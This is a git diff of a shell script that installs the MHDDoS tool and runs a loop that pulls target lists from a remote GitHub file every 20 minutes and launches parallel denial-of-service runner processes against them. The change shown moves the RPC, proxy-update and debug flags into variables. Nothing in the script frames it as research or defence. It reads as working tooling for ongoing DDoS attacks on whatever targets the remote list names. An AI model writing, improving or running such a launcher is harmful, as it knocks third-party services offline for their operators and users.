@@ -12,6 +12,9 @@ sudo git clone https://github.com/MHProDev/MHDDoS.git
 sudo python3 -m pip install -r MHDDoS/requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
+rpc="--rpc 100"
+proxy_upd="-p 3600"
+debug="--debug"
 
 # Restart attacks and update targets every 20 minutes
 while true
@@ -24,7 +27,7 @@ do
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
             echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads " --rpc 100" " -p 3600" " --debug"&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
 sleep 20m
 done
